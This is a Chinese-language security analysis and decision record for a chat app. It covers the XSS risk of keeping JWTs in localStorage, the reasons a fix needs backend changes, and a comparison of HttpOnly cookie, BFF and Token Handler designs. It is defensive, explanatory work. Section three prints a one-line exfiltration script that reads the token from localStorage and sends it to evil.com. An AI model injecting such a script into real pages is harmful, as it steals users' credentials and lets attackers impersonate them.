# 09 · localStorage 存 JWT 的 XSS 风险分析（含为何前端无法独立修复）

> 类别：安全（凭据存储）
> 涉及文件：`src/utils/token.ts`、`src/utils/http.ts`、`src/views/loginView/index.tsx`、redux-persist 的 `persist:root`
> **本报告是分析与决策记录**——它论证了"为何前端无法独立修复、最佳实践是什么"。
>
> **【后续更新】决策已落地：** 第十节的待办已在一次前后端协同改造中完成，凭据已从 localStorage 迁至 HttpOnly cookie。具体实现见配套报告：
> - [10 · HttpOnly cookie + CSRF 双提交鉴权迁移](./10-HttpOnly-cookie-与-CSRF-双提交鉴权迁移.md)（本报告的主落地）
> - [11 · socket.io 握手鉴权与服务端派生身份](./11-socket-握手鉴权与服务端派生身份.md)
> - [12 · JWT 密钥改从环境变量读取](./12-JWT-密钥环境变量化.md)
> - [13 · CORS 收敛为白名单并启用 cookie-parser](./13-CORS-收敛与-cookie-parser.md)

## 一、现状

登录拿到的 JWT 全程存在 `localStorage`，并以 `Authorization: Bearer` 头发送：

```ts
// loginView：登录成功后
localStorage.setItem('token', loginData.token);
// token.ts：读写封装
localStorage.setItem(TOKEN_KEY, token);
localStorage.getItem(TOKEN_KEY);
// http.ts 请求拦截器：每个请求带上
config.headers.Authorization = `Bearer ${token}`;
```

此外 `localStorage` 里还存了：用户信息 `user`（`setUserInfo`）、redux-persist 的整棵持久化状态 `persist:root`（含会话、好友等）。也就是说**关键凭据和大量业务数据都明文躺在 localStorage**。

## 二、概念扫盲：localStorage 是什么、JWT 是什么

- **localStorage**：浏览器提供的同源（origin）持久化键值存储，约 5MB，纯字符串，**没有过期机制**，关浏览器也不丢。它对**同源下的任何 JavaScript 完全开放**——`localStorage.getItem` 谁都能调。
- **JWT（JSON Web Token）**：一段 `header.payload.signature` 的字符串。payload 是 **base64url 编码、非加密**的，任何人都能解开看内容（本项目 `parseToken` 就是这么读 `exp` 的）。它的安全性来自 signature——服务端用密钥验签，篡改即失效。但**"偷到整段 token 就能冒充你"**——JWT 是 bearer token（持票即可用），不绑定设备。

把"持票即可用的凭据"放进"任何同源 JS 都能读的存储"，风险点就在这里。

## 三、风险本体：一次 XSS 就能盗走 token

**XSS（跨站脚本）**：攻击者设法让恶意 JS 在你的页面源下执行（如某处把用户输入未转义地插进 DOM、引入了被投毒的第三方脚本、依赖供应链被污染）。一旦发生，恶意脚本和你自己的代码同源、同权限，于是：

```js
// 攻击者注入的脚本，一行就能把凭据外带
new Image().src = 'https://evil.com/steal?t=' + localStorage.getItem('token');
// 连带 persist:root 里的会话/好友数据也能一起捞走
```

token 被外带后，攻击者在自己机器上拿这段 token 发请求，服务端验签通过——**完全冒充你的身份，直到 token 过期**。注意：

- 这与"传输是否 HTTPS"无关。HTTPS 防的是链路监听，防不住"页面内的 JS 主动读取并上传"。
- 这与"token 是否加密签名"无关。攻击者不需要伪造 token，**原样转发偷来的就行**。
- 本项目有 token 刷新机制，但刷新只换 access token，攻击者偷到后在有效期内照样能用，甚至可能借机刷新续命。

## 四、对照：httpOnly cookie 为什么能挡住这一击

把凭据放进带 **`HttpOnly`** 标志的 cookie，浏览器会**禁止任何 JavaScript 读取它**（`document.cookie` 读不到，更没有 API 能取）。于是即便发生 XSS，恶意脚本也拿不到 token 本体——它**只能在当前页面"借用"浏览器自动携带的 cookie 发请求，无法把凭据外带到攻击者服务器**。攻击面从"凭据泄露、可异地长期冒充"降级为"仅限受害页面在线期间的操作"，量级完全不同。

配套要点：

- `Secure`：只在 HTTPS 下发送，防链路泄露；
- `SameSite=Lax/Strict`：限制跨站携带，缓解 CSRF；
- cookie 会被浏览器**自动附带**，所以不再需要前端手动加 `Authorization` 头。

## 五、为什么前端无法独立修复——这是本报告"只分析不改码"的原因

`HttpOnly` cookie **只能由服务端通过响应头 `Set-Cookie: token=...; HttpOnly` 下发**。前端 JavaScript **既无法创建 HttpOnly cookie，也无法读取它**（这正是它安全的根本）。因此：

> **把 token 从 localStorage 迁到 HttpOnly cookie，是一次需要后端改造的架构变更，不是前端能单方面完成的"重构"。**

具体需要后端：登录接口改为 `Set-Cookie`（HttpOnly+Secure+SameSite）下发 token；所有受保护接口改为从 cookie 读凭据而非 `Authorization` 头；新增 CSRF 防护（见第六节）；刷新接口同步改造。前端再相应去掉手动塞头、去掉 localStorage 读写。**在后端就绪前，强行把前端 token 读写删掉只会让应用直接无法登录**——所以本次不动代码，先把问题、方案、待办沉淀成此文档。

## 六、各方案取舍

| 方案 | XSS 下凭据是否可被盗 | CSRF 风险 | 需要后端改造 | 备注 |
|------|------------------|----------|------------|------|
| localStorage 存 token（现状） | ❌ 可被任意 JS 读取外带 | 无（不自动携带） | 否 | 实现最简单，但 XSS 即失守 |
| HttpOnly + Secure + SameSite cookie | ✅ JS 读不到 | 有（cookie 自动携带）→ 需 SameSite/CSRF token | 是 | SPA 鉴权的主流推荐 |
| 内存（JS 变量）存 access token + HttpOnly cookie 存 refresh token | ✅✅ access 不落盘、refresh JS 读不到 | refresh 接口需 CSRF 防护 | 是 | 安全性最高，刷新逻辑较复杂；当前业界最佳实践 |
| sessionStorage | ❌ 同 localStorage（仅生命周期短些） | 无 | 否 | 关标签即清，但 XSS 期间一样可读，**不是安全方案** |

关键认知：**localStorage ↔ XSS、cookie ↔ CSRF** 是两组对应关系。换到 cookie 不是"消灭风险"，而是把"易被 XSS 窃取"换成"需防 CSRF"——而 CSRF 有 `SameSite` + CSRF token 等成熟解法，且无法像 XSS 那样把凭据外带，整体收益为正。

## 七、后端就绪前，前端现在能做的"减面"措施

迁移 cookie 之前，前端能做的是**压缩 XSS 攻击面**（治标，降低被打中的概率）和**控制爆炸半径**：

1. **杜绝 XSS 注入点**：不用 `dangerouslySetInnerHTML` 渲染任何不可信内容；必须用时先经 DOMPurify 净化。React 默认转义已挡住大部分场景，要警惕的是手动插 HTML、`href=javascript:`、富文本渲染。
2. **配置 CSP（Content-Security-Policy）响应头**：限制脚本来源（`script-src 'self'`），即便注入成功也难加载外部恶意脚本、难外带数据。这需后端/网关下发头，但属独立增量。
3. **第三方依赖治理**：XSS 也可能来自被投毒的 npm 包；锁版本、定期 `pnpm audit`。
4. **缩短 access token 有效期** + 已有的刷新机制：缩短被盗后可用窗口。
5. **不在 localStorage 多存敏感数据**：`persist:root`、`user` 里的 PII 能不持久化就不持久化，减少一旦失守的泄露面。

这些都**降低概率、限制损失，但都不能根除**"localStorage 可被 JS 读"这一根因。根治仍须第五节的后端改造。

## 八、业界做法与 Web vs Native 对比

- **业界争论与共识**：localStorage 存 JWT 长期被诟病；OWASP 明确不推荐用 Web Storage 存会话凭据。
- **Web vs Native**：原生端没有"任意脚本同源执行"这种 XSS 模型，凭据存于系统级安全区——iOS **Keychain**、Android **Keystore/EncryptedSharedPreferences**，受系统加密与沙箱保护，威胁模型与 Web 截然不同。所以"原生这么存没事，Web 照搬"是错的：Web 的 localStorage 没有任何访问控制，本质是"同源全公开"。

## 九、最佳实践到底是什么：权威分级与 BFF 是不是答案

问题"该 XSS 漏洞的核心是 token 的不安全使用，最佳实践是不是引入 BFF 架构？"——**方向上对，但要分清"原则"和"具体架构"，并落到 OurChat 自身。**

### 9.1 权威分级：IETF 给出的三种模式（按安全性递减）

业界最权威的依据是 IETF 工作组草案 **《OAuth 2.0 for Browser-Based Applications》（draft-26，2025-12）**。它把浏览器应用的鉴权架构明确排了序：

| 优先级 | 模式 | token 是否进入浏览器 | 说明 |
|--------|------|------------------|------|
| 最高（推荐） | **BFF（Backend For Frontend）** | **完全不进** | 后端作为机密客户端持有 token，浏览器只拿 HttpOnly 会话 cookie，**所有** API 请求经后端代理转发，由后端在出站时贴上真实 token |
| 中 | **Token-Mediating Backend** | 进入 | 后端负责拿 token 并下发 cookie，但 SPA 仍**直接**带 access token 调资源服务器——token 仍落到浏览器，弱于 BFF |
| 最低（仅在无后端时） | **Browser-based OAuth Client** | 进入且全程在浏览器 | tokens 全在前端，就是 localStorage/内存方案，安全性最差 |

**核心判据只有一句**：token 是否对浏览器里的 JS 可见。BFF 之所以排第一，正因为它让 token **彻底不出现在浏览器**——这直接掐死了本报告第三节的攻击链（XSS 偷不到不存在的东西）。

### 9.2 BFF 到底怎么挡住 XSS（机制）

BFF 是一个与前端**同源**的后端组件，承担三件事：作为机密 OAuth 客户端与授权服务器交互；在 cookie 会话里保管 access/refresh token；**代理所有**到资源服务器的请求，出站时补上 access token。于是：

- **持久化窃取 / 单次窃取 token**：浏览器里根本没有 token，攻击者无从提取 → 被消除。
- **窃取后异地长期冒充**：拿不到 token，无法离线/异地使用 → 被消除。
- **残余风险（诚实说明）**：XSS 脚本仍运行在你的源下，它**仍能借浏览器自动携带的 cookie，向 BFF 发请求冒充用户操作**。但因为 cookie 是 HttpOnly，脚本**无法把凭据外带**，攻击被压缩到"受害者在线会话期间、且只能打 BFF 这一个面"——这正是"客户端劫持"无法升级为"会话劫持"的关键差别。**所以即便上了 BFF，XSS 治理依然不能省（CSP、转义、依赖审计）。**

新版草案还要求 BFF **强制出站白名单**（只代理到预定义的资源服务器），防止被诱导转发到攻击者服务器（SSRF 式泄露）。

### 9.3 Token Handler 模式：BFF 的工程化落地

Curity 提出的 **Token Handler Pattern** 是 BFF 的具体实现范式，把 BFF 拆成两个组件：

- **OAuth Agent**：处理与授权服务器的 OAuth 流程、换取 token；
- **OAuth Proxy**（常驻 API 网关）：拦截 SPA 到 API 的请求，把 cookie 翻译成 token。

cookie 用最强属性（`HttpOnly` + `Secure` + `SameSite=Strict`），token 加密后存 cookie；**refresh token 单独放一个 cookie**（只在刷新时发送，不随每次请求带出）。Duende、FusionAuth 等也有各自实现，名字或叫 OAuth Proxy / Hosted Auth Proxy，本质同源。

### 9.4 关键反转：BFF 是为 OAuth 设计的，而 OurChat 不是 OAuth 应用

这是最容易被"照搬最佳实践"忽略的一点，必须说清：**上面整套 BFF / Token Handler 的语汇（机密客户端、授权服务器、OAuth Agent、access/refresh token）都建立在"OAuth/OIDC 第三方登录"之上。** 而 OurChat 的现状是：

- **第一方用户名密码登录**，后端自己签发自家 JWT，没有外部授权服务器；
- 没有 OAuth 授权码流程，也没有"从 AS 换 token"的 refresh 语义（项目里的 `/api/refresh` 只是自家续签）。

因此对 OurChat 而言，**应当采纳的是 BFF 的"原则"，而不是照抄 Token Handler 那套 OAuth 专用的重型组件**：

> **原则 = 让凭据永不进入 JS 可读的存储；浏览器只持 HttpOnly cookie；服务端持有/校验真实凭据。**

这个原则的最小落地，OurChat 并不需要单独立一个 OAuth Agent/Proxy 层，只需：**后端登录成功后把 JWT（或一个不透明 session id）写进 `HttpOnly + Secure + SameSite` cookie，受保护接口改为从 cookie 读凭据，并加 CSRF 防护。** 这就拿到了 BFF 90% 的安全收益（token 不可被 JS 读、不可外带），而没有引入一整套 OAuth 代理层的复杂度。

**什么时候 OurChat 才真正需要"完整 BFF 代理层 / Token Handler"？**
- 接入第三方登录（微信/Google OAuth），出现真正的授权服务器与第三方 token——这时 OAuth Agent 才有意义；
- 后端裂变为多个微服务、前置 API 网关，需要在网关统一做 cookie↔token 翻译；
- 需要把对资源服务器的 token 也彻底藏起来（升到 IETF 的"最高"档）。
- 在此之前，"自签 JWT 进 HttpOnly cookie + CSRF"已是与 OurChat 体量匹配、性价比最高的方案。

### 9.5 OurChat 专属考量：socket.io / WebRTC

OurChat 是实时聊天，鉴权方案必须同时覆盖 WebSocket：

- **cookie 方案天然适配 socket.io**：WS 握手是同源 HTTP 升级请求，浏览器会**自动携带 HttpOnly cookie**，后端在握手阶段校验即可——比现在"手动把 token 塞进 socket auth 字段"更省事，且 token 不再经 JS 传递。
- **若走"完整 BFF 全代理"则要注意**：BFF 要支持 **WebSocket 代理**，且聊天是长连接/高频流量，全量代理会给 BFF 增加延迟与成本。对实时应用，这是"全代理 BFF"相比"仅 cookie 化"的额外代价——又一条"OurChat 当前没必要上完整 BFF"的理由。

### 9.6 引入 cookie 的代价：CSRF（必须配套）

把凭据放回 cookie 会**重新引入 CSRF**（这正是当年改用 localStorage+Bearer 想躲开的）。所以 cookie 化必须同时做 CSRF 防护，业界标准组合：

1. `SameSite=Lax/Strict`（首选 Strict）——浏览器层挡住跨站自动携带；
2. **前后端同源部署**——避免跨域预检开销，并让同源策略再加一层；
3. 必要时叠加 **double-submit / 反伪造 token + 自定义请求头**——自定义头会强制触发 CORS 预检，挡掉跨源调用。

记忆口诀：**localStorage ↔ XSS，cookie ↔ CSRF**。迁移不是"消灭风险"，而是把"易被 XSS 外带凭据"换成"需防 CSRF"——而 CSRF 有成熟解法且无法外带凭据，净收益为正。

## 十、结论与待办

- **直接回答**："核心是 token 不安全使用"判断正确；"引入 BFF" **方向正确**——但准确说法是**采纳 BFF 的原则（token 不进浏览器、只留 HttpOnly cookie）**。对 OurChat 这种第一方 JWT、带实时通信的应用，**当前最佳实践是"自签 JWT/Session 进 HttpOnly+Secure+SameSite cookie + CSRF 防护"这一 BFF 原则的轻量落地**，而非照搬面向 OAuth 的完整 Token Handler 代理层。后者留待接入第三方登录或微服务网关化时再上。
- **本次动作**：仅记录分析与决策，不改代码（后端未就绪时强删前端 token 读写会直接登录不能）。
- **建议待办（需前后端协同，列入后续排期）**：
  1. 后端登录/续签改 `Set-Cookie: HttpOnly; Secure; SameSite=Strict`；受保护接口与 socket.io 握手改从 cookie 读凭据。
  2. 同步引入 CSRF 防护（SameSite + 同源部署，必要时叠加 CSRF token / 自定义头）。
  3. 前端配合去掉手动 `Authorization` 头与 `localStorage` 的 token/用户信息读写，收敛 `persist:root` 中的 PII。
  4. 独立增量（不依赖上面、可先做）：配置 CSP 响应头、`pnpm audit` 审计第三方依赖、杜绝 `dangerouslySetInnerHTML` 等 XSS 注入点——压缩攻击面是任何方案下都必须保留的纵深防御。
  5. 若未来接入第三方 OAuth 登录或网关化，再评估升级到完整 BFF / Token Handler，并落实出站白名单（防 SSRF）。

## 参考资料

- [OAuth 2.0 for Browser-Based Applications（IETF draft-26）](https://datatracker.ietf.org/doc/draft-ietf-oauth-browser-based-apps/) —— 三种架构模式分级与 BFF 安全分析的权威来源
- [OAuth 2.0 for Browser-Based Apps（oauth.net 概览）](https://oauth.net/2/browser-based-apps/)
- [The Token Handler Pattern（Curity）](https://curity.io/resources/learn/the-token-handler-pattern/) —— BFF 的工程化实现范式
- [Best Practices for Storing Access Tokens in the Browser（Curity）](https://curity.medium.com/best-practices-for-storing-access-tokens-in-the-browser-6b3d515d9814)
- [Securing SPAs using the BFF Pattern（Duende）](https://duendesoftware.com/blog/20210326-bff) —— CSRF 纵深防御组合
- [A Guide to Backend-for-Frontend (BFF) Auth（FusionAuth）](https://fusionauth.io/blog/backend-for-frontend)
